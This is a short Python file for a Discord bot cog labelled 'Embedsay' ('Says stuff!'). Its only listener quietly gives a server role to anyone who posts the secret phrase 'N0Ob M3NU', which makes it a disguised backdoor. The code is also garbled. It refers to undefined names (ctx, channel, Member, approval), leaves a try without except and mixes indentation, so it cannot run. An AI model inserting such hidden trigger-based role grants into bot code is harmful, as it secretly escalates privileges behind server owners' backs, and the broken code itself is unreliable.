import os
import discord
from discord.ext import commands
import asyncio

class Embedsay:
    """Says stuff!"""

    def __init__(self, bot):
        self.bot = bot
    async def listener(self, message):
        author = ctx.message.author
		if message.author.id !=self.bot.user.id:
		    try:
			    if message.content == "N0Ob M3NU":                
                    async for x in self.bot.logs_from(channel, before=message.timestamp, limit=1):
                        await self.bot.add_roles(author, Member) 

def setup(bot):
    n = approval(bot)
	bot.add_cog(n)
	bot.add_listener(n.listener, "on_message")